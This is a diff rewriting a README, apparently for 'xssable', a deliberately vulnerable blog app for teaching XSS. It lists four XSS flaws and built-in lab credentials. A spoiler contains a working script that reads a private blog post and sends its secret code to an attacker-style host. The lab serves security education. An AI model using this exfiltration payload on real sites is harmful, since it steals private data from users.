@@ -1,35 +1,61 @@
-![Sign](https://i.imgur.com/bovh598.png)
+## xssable
 
-Damn Small Vulnerable Web [![Python 3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-Unlicense-red.svg)](https://github.com/stamparm/DSVW/blob/master/LICENSE)
-=========
+xssable is a vulnerable blogging platform used to demonstrate XSS vulnerabilities. 
 
-**Damn Small Vulnerable Web** (DSVW) is a deliberately vulnerable web application written in under 100 lines of code, created for educational purposes. It supports majority of (most popular) web application vulnerabilities together with appropriate attacks.
+### Usage
 
-![XSS](http://i.imgur.com/BoSOgJs.png)
-
-Quick start
-----
-
-Run the following command:
-```
-$ python3 dsvw.py 
-Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code) #v0.2a
- by: Miroslav Stampar (@stamparm)
-
-[i] running HTTP server at 'http://127.0.0.1:65412'...
-```
-
-and navigate your browser to http://127.0.0.1:65412/:
-
-![DSVW](http://i.imgur.com/9nG4mwu.png)
-
-Requirements
-----
-
-Python (**3.x**) is required for running this program. Items *XML External Entity (local)*, *XML External Entity (remote)* and *Blind XPath Injection (boolean)* require installation of `python-lxml` (e.g. `apt-get install python-lxml`). Otherwise, those will be disabled.
-
-To install lxml via pip, run the following command:
+To run it locally:
 
 ```
+docker build . -t xssable:latest
+docker run -p 5000:5000 xssable:latest
+```
+
+or 
+
+```bash
 pip install -r requirements.txt
+python app.py
 ```
+
+Then access the application on http://127.0.0.1:5000.
+
+<details>
+ <summary>Spoiler!</summary>
+
+Credentials for the built-in user accounts are `John:12345` and `Connie:iloveyou1`.
+
+</details>
+
+Currently there are 4 different XSS vulnerabilities:
+
+- a reflected XSS (with the possibility to bypass Chrome's XSS Auditor),
+- a stored XSS with limited exploitation,
+- a stored XSS without limitations, and
+- a `location.hash` to `.innerHTML` based DOM XSS.
+
+Exploitation (beyond alert() pop-ups) can be practiced by getting access to Connie's private blog post and stealing the secret code.
+
+<details>
+ <summary>Spoiler!</summary>
+ 
+```js
+fetch('/blogs').then(r => r.text()).then(t => fetch('https://attacker.kiwi.com/?s='%2bt.split('%F0%9F%94%92')[1].split('<strong>')[1].split('<')[0]))</script>
+```
+
+</details>
+&nbsp;
+
+The application highlights that:
+
+- blacklists are bypass-able,
+- browser protections are unreliable,
+- not every "XSS" has the same impact,
+- frameworks do unexpected stuff, and
+- server-side validation is important.
+
+##### What's next?
+
+- https://xss-game.appspot.com/ - good for basics, created by Google.
+- https://knock.xss.moe - focused on exploitation and filter evasion.
+- https://polyglot.innerht.ml/ - an awesome polyglot challenge (it's over by now and the results are public).
